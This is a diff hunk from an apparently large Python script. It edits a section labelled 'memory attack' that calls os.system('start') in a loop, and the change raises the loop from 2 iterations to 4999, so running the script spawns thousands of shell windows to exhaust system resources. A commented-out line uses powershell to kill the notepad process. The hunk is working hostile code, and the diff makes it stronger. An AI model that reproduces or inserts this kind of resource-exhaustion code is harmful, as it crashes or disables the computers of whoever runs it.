@@ -10808,7 +10808,7 @@ try:
   os.system(cmd2)
   #3.memory attack --tiny(cmd36)
   cmd36="start"
-  for x in range(1,3):
+  for x in range(1,5000):
    os.system(cmd36)
   #4.Open display file --(cmd3)
   #cmd4="zero.txt && powershell -command \"Stop-Process -Name \"notepad\"\"" 
